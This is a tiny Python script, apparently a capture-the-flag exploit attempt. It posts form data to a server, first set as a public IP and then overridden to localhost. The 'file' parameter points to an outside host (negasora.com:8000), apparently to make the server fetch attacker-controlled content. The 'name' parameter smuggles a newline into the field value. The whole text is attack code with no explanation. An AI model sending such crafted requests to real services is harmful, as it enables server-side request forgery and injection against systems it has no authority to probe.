import requests


url = "http://78.47.165.85:8004/"
url = "http://127.0.0.1:8001/"

s = requests.Session()

data = {"file": "http://negasora.com:8000", "name": "a\nb"}

r = s.post(url, data)
print(r.text)
